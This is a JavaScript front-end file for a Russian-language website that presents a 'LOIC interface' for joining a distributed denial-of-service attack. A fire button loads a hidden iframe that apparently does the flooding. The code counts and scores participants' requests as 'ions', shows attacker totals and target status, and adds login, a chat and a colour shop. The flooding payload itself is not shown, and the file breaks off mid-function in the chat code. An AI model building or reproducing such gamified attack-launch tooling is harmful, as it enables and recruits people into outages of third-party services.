$(document).ready( function(){
//TITS
var titsUrl;
$('#matrix').click( function(){
	titsUrl = "images/tits/tits"+ Math.floor(Math.random()*17) +".jpg";
	$('body').css("background-image", "url('" + titsUrl +"')");
});
//Load Chat
var chat = false;
$('#chatmessage p').click( function(){
    $('#chatmessage').ajaxStart(function() {
            $(this).html('<span>Загрузка...</span>');
    });
    $('#chatmessage').ajaxStop(function() {
            $(this).hide().html('<p>Войти в чат</p>');
            $('#smilesShow').show();
            chat = true;
    });
    $('#chatmessage').after('<div id="yshout"></div>');
    $('#chatModule').append("<p id='yshoutstarter'><script> new YShout({yPath: './chat/',	log: 1}) </script></p>");
});
//$('#attackStats').click( function(){
//    if (chat == true){
//        $('#yshout').remove();
//        $('#yshoutstarter').remove();
//        $('#smilesShow').hide();
//        $('#chatmessage').show();
//        chat = false;
//    }
//});
//input focus
$('#loginPass, #regPass').focus( function(){
	if ( $(this).val() == "..............." ){
		$(this).val("");
	}
});
$('#loginPass, #regPass').blur( function(){
	if ( !$(this).val() ){
		$(this).val("...............");
	}
});
//######## LOIC interface########
var fireButton = document.getElementById("fireButton"),
	succeededCtrNode = document.getElementById("succeededCtr"),
	isFiring = false,
	succeededCtr,
	countCtr,
	countAttInt,
	postReqInt,
	session_name,
	session_id,
        srchost,
	attackStarted = false;
function attackStart(){
	$('body').append('<div id="loicframe" style="display:none;"><iframe src="scripts/hello.htm" width="1" height="1" scrolling="no"></div>');
	countAttackers();
	countAttInt = setInterval( countAttackers, 120000);
	countCtr = setInterval( countRequests, 1000);
	postReqInt = setInterval( updateScore, 120000);
	startScore();
	$('#fireButton').css('background-image','url(images/button1.png)');
	$('#smoke').hide();
	$('#fire').show();
	attackStarted = true;
}
function attackStop(){
	$('#loicframe').remove();
	clearInterval(countCtr);
	clearInterval(countAttInt);
	clearInterval(postReqInt);
	updateScore();
	$('#fireButton').css('background-image','url(images/buttonh.png)');
	$('#smoke').show();
	$('#fire').hide();
	attackStarted = false;
}
function countRequests(){
	succeededCtr ++;
	$("#succeededCtr").text(succeededCtr);
}
function startScore(){
	$.post("online/stats.php", {action: "start_score"});
}
function updateScore(){
	$.post("online/stats.php", {action: "update_score"}, function(data)
	{
		if (data.status == "query_update_error" || data.status == "db_error"){
			alert("DB Error");
		} else {
			$('#statsTitle').text(data.title);
		}
	}, 'json');
}

fireButton.onclick = function () {
	if (isFiring) {
		isFiring = false;
		attackStop();
	} else {
		isFiring = true;
		attackStart();
	}
}
function showAttackers(){
        $.get('online/online.php', function(data){
            $('#attackcontainer').text(data.attackers);
        },"json")
}
function countAttackers(){
	$.get('online/online.php?a=1', function(data){
            $('#attackcontainer').text(data.attackers);
        },"json")
}
function reloader(){
	$('#reloader').load('online/reload.php');
}
var showAttInt = setInterval( showAttackers, 60000);
var reloadInt = setInterval(reloader, 180000);
showAttackers();
//####### Програссбар для счетчика атакующих
function  usersProgressbar(){
	var usersRand = 10 + Math.floor(Math.random()*5);
    var onliners = $("#responsecontainer").text();
    var attackers = $("#attackcontainer").text();
    var offset = 156*(attackers/onliners)-156 - usersRand;
    $('#barLine').animate({marginLeft: offset}, 900);
	$('#attackcontainer').animate({marginLeft: (offset+172)}, 900, function(){
		$('#attackcontainer').animate({marginLeft: (offset + 172 + usersRand)}, 500);
		$('#barLine').animate({marginLeft: offset + usersRand}, 500);
	});
}
//####### Делаем счетчик атакующих мигать
function attackersBlink(){
	$('#attackcontainer').fadeIn();
	function attackersFadeOut(){
		$('#attackcontainer').fadeOut();
	}
	setTimeout(attackersFadeOut,1000);
}
setInterval(usersProgressbar, 9000);
setInterval(attackersBlink, 3500);
setTimeout(usersProgressbar, 500);

//####### Статус цели

function targetStatus(){
	var statusArr;
	var statusLen;
	$('#statusIn').load('online/agregator.php?url=ya.ru', function(){
		statusArr = $('#statusIn').text().split('\n');
		statusLen = statusArr.length - 1;
		function showStatus(n){
			$('#statusOut').append('<div>' + statusArr[n] + '</div>')
			$('#statusOut div').fadeIn();
		}
		for (var i = 0; i <= statusLen; i++){
			setTimeout(showStatus, 500*(i+1), i);
		}
	});
};

//####### Стрелка v. 0.7.1
// создаем канвас и задаем начальные координаты стрелки

var canvas = document.getElementById("arrow");
var context = canvas.getContext("2d");
//координаты вершин стрелки
var x = 50;
var y = 50;
var x0 = 50;
var y0 = 55;
var x1 = 50;
var y1 = 45;
var x2 = 0;
var y2 = 50;
var a0 = -120;
var arg = -120;
//Кружок по середине
var gradient = context.createRadialGradient(53,47,8,53,47,4);
gradient.addColorStop(0, '#888888');
gradient.addColorStop(1, '#FFFFFF');

function counterDraw(){
	var a1 = a0+180;
	var a2 = a0+270;
	//Вращаем вершины стрелки
	var k0x = 5*Math.cos(a0 * Math.PI/180);
	var k0y = 5*Math.sin(a0 * Math.PI/180);

	var k1x = 5*Math.cos(a1 * Math.PI/180);
	var k1y = 5*Math.sin(a1 * Math.PI/180);

	var k2x = 50*Math.cos(a2 * Math.PI/180);
	var k2y = 50*Math.sin(a2 * Math.PI/180);

	canvas.width = canvas.width;
	
	context.fillStyle = "#dc1516";
	context.strokeStyle = "#000000";
	context.lineWidth = 0.5;
	
	var gradient2 = context.createLinearGradient( (x+k0x),(x+k0y),(x+k1x),(x+k1y));
	gradient2.addColorStop(0, '#dc1516');
	gradient2.addColorStop(1, 'black');
	context.fillStyle = gradient2;
	
	context.moveTo( x+k0x, y+k0y);
	context.lineTo( x+k1x, y+k1y);
	context.lineTo( x+k2x, y+k2y);
	context.lineTo( x+k0x, y+k0y);

	context.fill();
	context.stroke();
	
	context.beginPath();
	context.arc(50, 50, 9, 0, Math.PI*2, true);
	context.fillStyle = gradient;
	context.fill();
	context.stroke();
};
var counterTimeout;
function counterStart(arg){
	if (a0 < arg){
		counterDraw();
		a0=a0+Math.floor(Math.random()*6);
		counterTimeout = setTimeout( counterStart, 50, arg);
	}
	else
	if (a0 >= arg){
		counterDraw();
		a0=a0-Math.floor(Math.random()*6);
		counterTimeout = setTimeout( counterStart, 50, arg);
	}
	else {counterDraw();}
};
var uOnline;
var refreshId = setInterval(countOnline, 60000);
function countOnline(){
        $.get('online/online.php', function(data){
            $('#responsecontainer').text(data.online);
            if ( $("#responsecontainer").text()-120 < 450 ){
                    uOnline = (0.5 * $("#responsecontainer").text()-120);
            } else {
                    uOnline = 120;
            }
            clearTimeout(counterTimeout);
            counterStart(uOnline);
        },"json")
}
countOnline();

//####### Интерфейс пользователя
//Регистрация и вход
var loggedIn;
//проверка вошел или нет
$('form').submit(function(){return false;});
$.post("online/stats.php", {action: "userenter"}, function(data)
{
	if (data.login == 1){
		$('.stat, #logoutButton').fadeIn();
		succeededCtr = data.score;
		$('#succeededCtr').text(data.score);
		$('#statsTitle').text(data.title);
                if (data.chatcolor != ""){
                    $('#statsChatcolor').css('background-color',data.chatcolor);
                }
//                var ach = data.ach;
//                for (var i = 0; i<ach.length; i++){
//                    $(".stat").append('<div id="stats_'+ data.ach[i] +'" class="achive"><img src="images/'+ data.ach[i] +'.jpg" /></div></div>');
//                }
	} else {
	//показываем форму входа и двачуем капчу
		$('#loginForm, #loginButton, #regButton').fadeIn();
		session_name = data.session_name;
		session_id = data.session_id;
	}
        //хост для фрейма
        srchost = data.srchost;
}, 'json');
//вход
function loginMsg(){
	$('#loginPass').hide();
	$('#loginMessages').fadeIn();
	setTimeout("$('#loginMessages').html('')",2000);
	setTimeout("$('#loginPass').fadeIn()",2000);
	setTimeout("$('#loginMessages').hide()",2000);
}
function logIn(){
	$('#loginMessages').html("");
	if ( $('#loginPass').val() == "" ){
		$('#loginMessages').html("Введите кодовое слово.");
	}
	else {
		var loginName = $('#loginPass').val();
		$.post("online/stats.php", {nick: loginName, action: "login"}, function(data){
				if ( data.status == "user_error" ){
					$('#loginMessages').html("Ошибка. Кодовое слово не найдено.");
					loginMsg();
				} else if ( data.status == "query_error" || data.status == "db_error"){
					$('#loginMessages').html("Ошибка базы данных.");
					loginMsg();
				} else {
					if (attackStarted == true){
						startScore();
					}
					$('.stat, #logoutButton').fadeIn();
					$('#loginForm, #loginMessages, #loginButton, #regButton').hide();
					$('#loginPass').val("");
					succeededCtr = data.score;
					$('#succeededCtr').text(data.score);
					$('#statsTitle').text(data.title);
                                        if (data.chatcolor != ""){
                                            $('#statsChatcolor').css('background-color',data.chatcolor);
                                        }
//                                        var ach = data.ach;
//                                        for (var i = 0; i<ach.length; i++){
//                                            $(".stat").append('<div id="stats_'+ data.ach[i] +'" class="achive"><img src="images/'+ data.ach[i] +'.jpg" /></div></div>');
//                                        } 
				}
		}, 'json');
	}
};
$('#loginButton').click( function(){
	logIn();
});

//выход
$('#logoutButton').click( function(){
	$('#logoutButton').hide();
	$.post("online/stats.php", {action: "logout"});
	$('.stat *').hide();
	attackStop();
	$(this).ajaxStop(function() {
		setTimeout("window.location.reload()",300);
	});
});

//Enter key press
$('#loginPass').keypress(function(event){
	if (event.which == '13' || event.which == '3') {
		logIn();
	}
});
$('#regPass, #captcha').keypress(function(event){
	if (event.which == '13' || event.which == '3') {
		regIn();
	}
});

//регистрация
$('#regButton').click( function(){
	$('#regMessages').html("");
	$('#loginArea, #loginButton, #regButton').hide();
	$('#regForm, #regArea, #regPass, #captchaForm, #register_now, #close_reg').fadeIn();
	document.getElementById('captchaimage').src = "scripts/kcaptcha.php?"+ session_name +"="+ session_id;
});
function regMsg(){
	$('#regMessages').fadeIn();
	$('#regPass').hide();
	setTimeout("$('#regMessages').html('')",2000);
	setTimeout("$('#regPass').fadeIn()",2000);
	setTimeout("$('#regMessages').hide()",2000);

}
function regIn(){
	var pattern0=/.{8,32}/;
        var pattern1=/[^\w]+/;
	var result0=pattern0.test($('#regPass').val());
        var result1=pattern1.test($('#regPass').val());
	if ( $('#regPass').val() == "" ){
		$('#regMessages').html("Введите кодовое слово.");
		regMsg();
	} else
	if ( result0 == false ){
		$('#regMessages').html("Минимальная длина слова 8 символов.");
		regMsg();
	} else if ( result1 == true){
		$('#regMessages').html("Используйте только буквы и цифры.");
		regMsg();
	} else {
		var captcha = $('#captcha').val();
		$.post("scripts/kcaptcha.php", {keystring: captcha, action: "check"}, function(data)
		{
			if ( data.captcha != 1){
				$('#regMessages').html("Капча введена неверно.");
				regMsg();
				document.getElementById('captchaimage').src = "scripts/kcaptcha.php?"+ session_name +"="+ session_id;
			}
			else {
				var regName = $('#regPass').val();
				$.post("online/stats.php", {nick: regName, action: "register"}, function(data)
				{
						if ( data.status == "user_error" ){
							$('#regMessages').html("Ошибка. Придумайте другой пароль.");
							regMsg();
						} else if ( data.status == "query_error" || data.status == "db_error"){
							$('#regMessages').html("Ошибка базы данных.");
							regMsg();
						} else {
							$('#regMessages').html("<p>Регистрация прошла успешно, <strong>"+ regName +"</strong>.</p>");
							$('#regMessages').show();
							$('#regPass').hide();
							$('#captchaForm, #register_now').hide();
							$('#regPass, #captcha').val("");
						}
				}, 'json');
			}
		}, 'json');
	}
};
$('#register_now').click( function(){
	regIn();
});
$('#close_reg').click( function(){
	$('#regArea, #loginArea, #loginButton, #regButton').toggle();
	$('#regMessages').hide();
	$('#regMessages').html("");
	$('#regPass, #captcha').val("");
});
$('#captchaimage').click( function(){
	this.src = "scripts/kcaptcha.php?"+ session_name +"="+ session_id;
});
//смена цвета
function shop_status(msg){
    $('#popuprel3').append("<div id='ss'>"+ msg +"</div>");
    setTimeout("$('#ss').remove()", 4000);
};
$('#buyColorButton').click( function(){
    var chatcolor = $("#buyColorInput").val();
    var pattern = /^#[A-Fa-f0-9]{6}$/;
    var result = pattern.test(chatcolor);
    if (result){
        $.post("online/stats.php", {chatcolor: chatcolor, action: "update_color"}, function(data)
        {
            if ( data.status == "db_error" ){
                shop_status("Ошибка базы данных");
            } else if (data.status == "no_ions"){
                shop_status("Недостаточно ионов");
            } else if (data.status == 200){
                succeededCtr = data.score;
                $('#succeededCtr').text(data.score);
                //цвет обновился
                $('#statsChatcolor').css('background-color',data.chatcolor);
                shop_status("Операция прошла успешно");
            }
        }, 'json');
    } else {
        shop_status("Цвет указан неправильно");
    }
});
$('#picker').farbtastic('#buyColorInput');
$('#buyColorInput').focus(function(){
    $('#picker').slideDown();
    $('#buyColorButton').show();
});
$('#buyColorInput').blur(function(){
    $('#picker').slideUp();
});
//####### Всплывающие подсказки
$('.tooltip').tooltip();

//####### BookMark
function createBookmark(name) {
	we = window.external;
	if (!we) {
		return true;
	} else {
		we.addFavorite('http://putinvzrivaetdoma.org/', name);
		return false;
	}
}

//####### Smiles menu
$('#ys-input-smiles').before('<img id="smilesShow" src="images/chelp.png"/>');

$('#smilesShow').click( function(){
	$('#ys-input-smiles').slideToggle();
	$('#ys-input-message').focus();
});
$('#ys-input-smiles img').click( function(){
	var messageEntered = $('#ys-input-message').val();
	$('#ys-input-message').val(messageEntered + $(this).attr('title'));
	$('#ys-input-message').focus();
});
//####### Каруселька
var focusIndex = 0;
var focusWidth = 200;
function scrollRight(offset){
   focusIndex++;
   if (focusIndex > 0)
   {
      $(".scrollLeft").css({'visibility': 'visible'});
   }
   var focusMargin = parseInt($(".carusel").css('marginLeft'), 10);
   $(".carusel").animate({marginLeft: focusMargin - offset +'px'},300);
   focusMargin = (focusMargin - offset);
   if (focusIndex == 6 ){
      $(".scrollRight").css({'visibility': 'hidden'});
   }
}
function scrollLeft(offset){
   var focusMargin = parseInt($(".carusel").css('marginLeft'), 10); 
   $(".carusel").animate({marginLeft: (focusMargin + offset) +'px'},300);
   focusMargin = (focusMargin + offset);
   focusIndex--;
   if (focusIndex == 0){
      $(".scrollLeft").css({'visibility': 'hidden'});
   }
   if (focusIndex < 6 ){
      $(".scrollRight").css({'visibility': 'visible'});
   }
}
$(".scrollRight").click( function(){
	scrollRight(focusWidth);
});
$(".scrollLeft").click( function(){
	scrollLeft(focusWidth);
})
//end of main $doc.ready
});

//####### Попап для юзербаров, голосования и прочего custom.js
$(document).ready(function() {
	$('a.popup').click(function() {
		var popupid = $(this).attr('rel');
		$('#' + popupid).fadeIn();
		$('body').append('<div id="fade"></div>');
		$('#fade').css({'filter' : 'alpha(opacity=80)'}).fadeIn();
		var popuptopmargin = ($('#' + popupid).height() + 10) / 2;
		var popupleftmargin = ($('#' + popupid).width() + 10) / 2;
		$('#' + popupid).css({
			'margin-top' : -popuptopmargin,
			'margin-left' : -popupleftmargin
		});
	});
	$('#fade').click(function() {
		$('#fade , #popuprel , #popuprel2 , #popuprel3, #popuprel4').fadeOut()
		return false;
	});
});

//####### Чатик yshout.js
String.prototype.sReplace = function(find, replace) {
	return this.split(find).join(replace);
};

String.prototype.repeat = function(times) {
	var rep = new Array(times + 1);
	return rep.join(this);
}

var YShout = function() {
	var self = this;
	var args = arguments;
	$(document).ready(function() {
		self.init.apply(self, args);
	});
} 

var yShout;

var timeoutsend;
var sendDelay = false;
var whomId;
var ignore_id = new Array();

/*function rgb2hex*/
function rgb2hex(color)
{
	color = color.replace(/\s/g,"");
	var aRGB = color.match(/^rgb\((\d{1,3}[%]?),(\d{1,3}[%]?),(\d{1,3}[%]?)\)$/i);

	if(aRGB)
	{
		color = '';
		for (var i=1; i<=3; i++) color += Math.round((aRGB[i][aRGB[i].length-1]=="%"?2.55:1)*parseInt(aRGB[i])).toString(16).replace(/^(.)$/,'0$1');
		return "#" + color;
	}
	else {
		color = color.replace(/^#?([\da-f])([\da-f])([\da-f])$/i, '$1$1$2$2$3$3');
		return color;
	}
}
//парсим куки
function readIgnore(name) {
    var j = 0;
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(name) == 0){
             ignore_id[j] = c.substring((name.length + 8),c.length);
             j++;
        }
    }
}
YShout.prototype = {
	animSpeed: 300,
	p: [],
		
	init: function(options) {
		yShout = this;
		var self = this;
		
		this.initializing = true;
		
		var dOptions = {
			yPath: 'chat/',
			log: 1
		};

		this.options = jQuery.extend(dOptions, options);

		this.postNum = 0;
		this.floodAttempt = 0;	
		
		// Correct for missing trailing /
		if ((this.options.yPath.length > 0) && (this.options.yPath.charAt(this.options.yPath.length - 1) != '/'))
			this.options.yPath += '/';
		
		if (this.options.yLink) {
			if (this.options.yLink.charAt(0) != '#')
				this.options.yLink = '#' + this.options.yLink;
		
			$(this.options.yLink).click(function() {
				self.openYShout.apply(self);
				return false;
			});
		}
		
		// Load YShout from a link, in-page
		if (this.options.h_loadlink) {
			$(this.options.h_loadlink).click(function() {
				$('#yshout').css('display', 'block');
				$(this).unbind('click').click(function() {return false;});
				return false;
			});
			this.load(true);
		} else
			this.load();
		

	},
	
	load: function(hidden) {
		if ($('#yshout').length == 0) return;

		if (hidden) $('#yshout').css('display', 'none');
		
		
	
			
			
		this.ajax(this.initialLoad, { 
			reqType: 'init',
			yPath: this.options.yPath,
			log: this.options.log
		});
	},
	
	initialLoad: function(updates) {
		
	
		
		
		if (updates.yError) alert('There appears to be a problem: \n' + updates.yError + '\n\nIf you haven\'t already, try chmodding everything inside the YShout directory to 777.');
		
		
	
		var self = this;
		

		
		this.prefs = jQuery.extend(updates.prefs, this.options.prefs);
		this.initForm();
		this.initRefresh();
		this.initLinks();
		if (this.prefs.flood) this.initFlood();

		if (updates.nickname)
			$('#ys-input-nickname')
				.removeClass('ys-before-focus')
				.addClass( 'ys-after-focus')
				.val(updates.nickname);

		if (updates)
			this.updates(updates);
	
		
		if (!this.prefs.doTruncate) {
			$('#ys-posts').css('height', $('#ys-posts').height + 'px');
		}

		if (!this.prefs.inverse) {
			var postsDiv = $('#ys-posts')[0];
			postsDiv.scrollTop = postsDiv.scrollHeight;
		}

		this.markEnds();
		
		this.initializing = false;
	},

	initForm: function() {
		this.d('In initForm');

		var postForm = 
			'<form id="ys-post-form" name="ys-post-form"' + (this.prefs.inverse ? 'class="ys-inverse"' : '' ) + '><fieldset>' +
				'<input id="ys-input-nickname" value="Anonymous" type="hidden" accesskey="N" maxlength="' + this.prefs.nicknameLength + '" class="ys-before-focus" />' +
				'<input id="ys-input-message" name="ys-input-message" value="' + this.prefs.defaultMessage + '" type="text" accesskey="M" maxlength="' + this.prefs.messageLength + '" class="ys-before-focus" />' +
				(this.prefs.showSubmit ? '<input id="ys-input-submit" value="' + this.prefs.defaultSubmit + '" accesskey="S" type="submit" />' : '') +
				(this.prefs.postFormLink == 'cp' ? '<a title="View YShout Control Panel" class="ys-post-form-link" id="ys-cp-link" href="' + this.options.yPath + 'cp/">Admin CP</a>' : '') +
				(this.prefs.postFormLink == 'history' ? '<a title="View YShout History" class="ys-post-form-link" id="ys-history-link" href="' + this.options.yPath + 'history/?log=' + this.options.log + '">View History</a>' : '') +
			'</fieldset></form>';

		var postsDiv = '<div id="ys-posts"></div>';

		if (this.prefs.inverse) $('#yshout').html(postForm + postsDiv);
		else $('#yshout').html(postsDiv + postForm);
		
		$('#ys-posts')
			.before('<div id="ys-before-posts"></div>')
			.after('<div id="ys-after-posts"></div>');
		
		$('#ys-post-form')
			.before('<div id="ys-before-post-form"></div>')
			.after('<div id="ys-after-post-form"></div>');
		
		var self = this;

		var defaults = { 
			'ys-input-nickname': self.prefs.defaultNickname, 
			'ys-input-message': self.prefs.defaultMessage
		};

		var keypress = function(e) { 
			var key = window.event ? e.keyCode : e.which; 
			if (key == 13 || key == 3) {
				self.send.apply(self);
				return false;
			}
		};

		var focus = function() { 
			if (this.value == defaults[this.id])
				$(this).removeClass('ys-before-focus').addClass( 'ys-after-focus').val('');
		};

		var blur = function() { 
			if (this.value == '')
				$(this).removeClass('ys-after-focus').addClass('ys-before-focus').val(defaults[this.id]); 
		};

		$('#ys-input-message').keypress(keypress).focus(focus).blur(blur);
		$('#ys-input-nickname').keypress(keypress).focus(focus).blur(blur);

		$('#ys-input-submit').click(function(){self.send.apply(self)});
		$('#ys-post-form').submit(function(){return false});
	},

	initRefresh: function() {
		var self = this;
		if (this.refreshTimer) clearInterval(this.refreshTimer)
		this.refreshTimer = setInterval(function() {
			self.ajax(self.updates, {reqType: 'refresh'});
		}, this.prefs.refresh); // ! 3000..?
	},

	initFlood: function() {
		this.d('in initFlood');
		var self = this;
		this.floodCount = 0;
		this.floodControl = false;

		this.floodTimer = setInterval(function() {
			self.floodCount = 0;
		}, this.prefs.floodTimeout);
	},

	initLinks: function() {
		if ($.browser.msie) return;
		
		var self = this;

		$('#ys-cp-link').click(function() {
			self.openCP.apply(self);
			return false;
		});

		$('#ys-history-link').click(function() {
			self.openHistory.apply(self);
			return false;
		});

	},
	
	openCP: function() {
		var self = this;
		if (this.cpOpen) return;
		this.cpOpen = true;
		
		var url = this.options.yPath + 'cp/';

		$('body').append('<div id="ys-overlay"></div><div class="ys-window" id="ys-cp"><a title="Close Admin CP" href="#" id="ys-closeoverlay-link">Close</a><a title="View History" href="#" id="ys-switchoverlay-link">View History</a><object class="ys-browser" id="cp-browser" data="' + url +'" type="text/html">Something went horribly wrong.</object></div>');

		$('#ys-overlay, #ys-closeoverlay-link').click(function() { 
			self.reload.apply(self, [true]);
			self.closeCP.apply(self);
			return false; 
		}); 
		
		$('#ys-switchoverlay-link').click(function() { 
			self.closeCP.apply(self);
			self.openHistory.apply(self);
			return false;
		});

	},

	closeCP: function() {
		this.cpOpen = false;
		$('#ys-overlay, #ys-cp').remove();
	},

	openHistory: function() {
		var self = this;
		if (this.hOpen) return;
		this.hOpen = true;
		var url = this.options.yPath + 'history/?log='+ this.options.log;
		$('body').append('<div id="ys-overlay"></div><div class="ys-window" id="ys-history"><a title="Close history" href="#" id="ys-closeoverlay-link">Close</a><a title="View Admin CP" href="#" id="ys-switchoverlay-link">View Admin CP</a><object class="ys-browser" id="history-browser" data="' + url +'" type="text/html">Something went horribly wrong.</object></div>');

		$('#ys-overlay, #ys-closeoverlay-link').click(function() { 
			self.reload.apply(self, [true]);
			self.closeHistory.apply(self);
			return false; 
		}); 

		$('#ys-switchoverlay-link').click(function() { 
			self.closeHistory.apply(self);
			self.openCP.apply(self);
			return false;
		});

	},

	closeHistory: function() {
		this.hOpen = false;
		$('#ys-overlay, #ys-history').remove();
	},
	
	openYShout: function() {
		var self = this;
		if (this.ysOpen) return;
		this.ysOpen = true;
		url = this.options.yPath + 'example/yshout.html';

		$('body').append('<div id="ys-overlay"></div><div class="ys-window" id="ys-yshout"><a title="Close YShout" href="#" id="ys-closeoverlay-link">Close</a><object class="ys-browser" id="yshout-browser" data="' + url +'" type="text/html">Something went horribly wrong.</object></div>');
	
		$('#ys-overlay, #ys-closeoverlay-link').click(function() { 
			self.reload.apply(self, [true]);
			self.closeYShout.apply(self);
			return false; 
		}); 
	},

	closeYShout: function() {
		this.ysOpen = false;
		$('#ys-overlay, #ys-yshout').remove();
	},
	
	send: function() {
		if (sendDelay == true) {
			return;
		} else {
			sendDelay = true;
			if (!this.validate()) return;
			if (this.prefs.flood && this.floodControl) return;
			
			var  postNickname = $('#ys-input-nickname').val(), postMessage = $('#ys-input-message').val().replace(/(.*:\S{1,3}:.*){6,20}/g, '$1');
			
			if (postMessage == '/openadmincp'){
				this.openCP();
				sendDelay = false;
			}
			else {
				this.ajax(this.updates, {
					reqType: 'post',
					nickname: postNickname,
					message: postMessage
				});
				$('#ys-input-message').val('')
				if (this.prefs.flood) this.flood();
				setTimeout("sendDelay = false", 5000);
			}
		}
	},
	validate: function() {
		var nickname = $('#ys-input-nickname').val(),
				message = $('#ys-input-message').val(),
				error = false;
		
		var showInvalid = function(input) {
			$(input).removeClass('ys-input-valid').addClass('ys-input-invalid')[0].focus();
			error = true;
		}

		var showValid = function(input) {
			$(input).removeClass('ys-input-invalid').addClass('ys-input-valid');
		}

		if (nickname == '' ||	nickname == this.prefs.defaultNickname)
			showInvalid('#ys-input-nickname');
		else
			showValid('#ys-input-nickname');

		if (message == '' || message == this.prefs.defaultMessage)
			showInvalid('#ys-input-message');
		else
			showValid('#ys-input-message');

		return !error;
	},

	flood: function() {
		var self = this;
		this.d('in flood');
		if (this.floodCount < this.prefs.floodMessages) {
			this.floodCount++;
			return;
		}

		this.floodAttempt++;
		this.disable();

		if (this.floodAttempt == this.prefs.autobanFlood)
			this.banSelf('You have been banned for flooding the shoutbox!');
			
		setTimeout(function() {
			self.floodCount = 0;
			self.enable.apply(self);
		}, this.prefs.floodDisable);
	},

	disable: function () {
		$('#ys-input-submit')[0].disabled = true;
		this.floodControl = true;
	},

	enable: function () {
		$('#ys-input-submit')[0].disabled = false;
		this.floodControl = false;
	},
	
	findBySame: function(ip) {
		if (!$.browser.safari) return;
		
		var same = [];
		for (var i = 0; i < this.p.length; i++)
			if (this.p[i].adminInfo.ip == ip) 
				same.push(this.p[i]);
		
		for (var i = 0; i < same.length; i++) {
			$('#' + same[i].id).fadeTo(this.animSpeed, .8).fadeTo(this.animSpeed, 1);
		}
	},
	
	updates: function(updates) {
		if (!updates) return;
		if (updates.prefs) this.prefs = updates.prefs;
		if (updates.posts) this.posts(updates.posts);
		if (updates.banned) this.banned();
	},

	banned: function() {
		var self = this;
		clearInterval(this.refreshTimer);
		clearInterval(this.floodTimer);
		if (this.initializing)
			$('#ys-post-form').css('display', 'none');
		else
			$('#ys-post-form').fadeOut(this.animSpeed);
		
		if ($('#ys-banned').length == 0) {
			$('#ys-input-message')[0].blur();
			$('#ys-posts').append('<div id="ys-banned"><span>Похоже, что тебе тут не рады. Храни наш чатик уютным. Если хочешь справедливости, пиши: putin.vzrivaet@mail.com</span></div>');

			$('#ys-banned-cp-link').click(function() {
				self.openCP.apply(self);
				return false;
			});
			
			$('#ys-unban-self').click(function() {
				self.ajax(function(json) {
					if (!json.error)
						self.unbanned();
					 else if (json.error == 'admin')
						alert('Эта кнопка не работает.');
				}, {reqType: 'unbanself'});
				return false;
			});
		}		
	},

	unbanned: function() {
		var self = this;
		$('#ys-banned').fadeOut(function() {$(this).remove();});
		this.initRefresh();
		$('#ys-post-form').css('display', 'block').fadeIn(this.animSpeed, function(){
			self.reload();
		});
	},
	
	posts: function(p) {
		for (var i = 0; i < p.length; i++) {
			this.post(p[i]);
		}
		
		this.truncate();
		
		if (!this.prefs.inverse) {
			var postsDiv = $('#ys-posts')[0];
			postsDiv.scrollTop = postsDiv.scrollHeight;
		}
	},

	post: function(post) {
                readIgnore("ignore");
                for (i = 0; i < ignore_id.length; i++){
                    if (post.uid == ignore_id[i]){
                        return;
                    }
                }
		var self = this;
	
		var pad = function(n) {return n > 9 ? n : '0' + n;};
		var date = function(ts) {return new Date(ts * 1000);};
		var time = function(ts) { 
			var d = date(ts);
			var h = d.getHours(), m = d.getMinutes(), sec = d.getSeconds();

			if (self.prefs.timestamp == 12) {
				h = (h > 12 ? h - 12 : h);
				if (h == 0) h = 12;
			}

			return pad(h) + ':' + pad(m) + ':' + pad(sec);
		};

		var dateStr = function(ts) {
			var t = date(ts);

		  var Y = t.getFullYear();
		  var M = t.getMonth();
		  var D = t.getDay();
		  var d = t.getDate();
		  var day = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'][D];
		  var mon = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
		             'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'][M];

		  return day + ' ' + mon + '. ' + d + ', ' + Y;
		};

		var self = this;


		this.postNum++;
		var id = 'post-' + this.postNum;
		post.id = id;
		
		post.message = this.links(post.message);
		post.message = this.smileys(post.message);
		post.message = this.bbcode(post.message);
		post.message = this.answer(post.message);
		var html = 
			'<div id="' + id + '" class="ys-post'+ (post.banned ? ' ys-banned-post' : '') + '">' +
				(this.prefs.timestamp> 0 ? '<div class="pogon" id="pg_'+ post.level +'"></div><div style="margin-left:13px"><span class="ys-post-timestamp" title="' + post.nickname + '" style="color:' + post.chatcolor + ';">' + time(post.timestamp) + '</span> ' : '') +
				'<span class="'+ (post.admin ? 'ys-admin-post' : 'ys-post-message') +'">' + post.message + '</span></div> ' +
				'<a title="Игнор" class="ys-ignore-link" href="#">&times;</a>' + (post.adminInfo ? '<div class="ys-post-actions">'+post.adminInfo.ip+' '+post.adminInfo.nickhash+'<br>' + (post.banned ? '<a title="Unban" class="ys-ban-link" href="#">Unban</a>' : '<a title="Ban" class="ys-ban-link" href="#">Ban</a>') : '') + '</div>' +
			'</div>';
		if (this.prefs.inverse) $('#ys-posts').prepend(html);
		else $('#ys-posts').append(html);
		
		this.p.push(post);

		$('#' + id)
			.find('.ys-post-nickname').click(function() {
				if (post.adminInfo)
					self.findBySame(post.adminInfo.ip);
			}).end()
			.find('.ys-info-link').toggle(
				function() {self.showInfo.apply(self, [id, this]);return false;},
				function() {self.hideInfo.apply(self, [id, this]);return false;})
			.end()
			.find('.ys-ban-link').click(
				function() {self.ban.apply(self, [post, id]);return false;})
			.end()
			.find('.ys-delete-link').click(
				function() {self.del.apply(self, [post, id]);return false;})
			.end()
			.find('.ys-ignore-link').click(
				function() {
                                    self.ignore.apply(self, [post, id]);return false;
                                })
			.end()
			.find('.ys-post-timestamp').click(function(){
				self.answerTo(id);
			});
	},
	
	showInfo: function(id, el) {
		var jEl = $('#' + id + ' .ys-post-info');
		if (this.prefs.info == 'overlay')
			jEl.css('display', 'block').fadeIn(this.animSpeed);
		else
			jEl.slideDown(this.animSpeed);
		
		el.innerHTML ='Close Info'
		return false;
	},
	answerTo: function(id) {
		var messageEntered = $('#ys-input-message').val();
		var whomTo = $('#' + id + ' .ys-post-timestamp').text();
		var whomColor = rgb2hex($('#' + id + ' .ys-post-timestamp').css('color'));
		$('#ys-input-message').val(whomTo + whomColor + " ");
		$('#ys-input-message').focus();
	},
	answer: function(s) {
		var patt = /([0-9]{2}):([0-9]{2}):([0-9]{2})#([0-9]|[a-f]){6}/;
		var whomId = patt.exec(s);
		if (whomId){
			whomId = whomId[0];

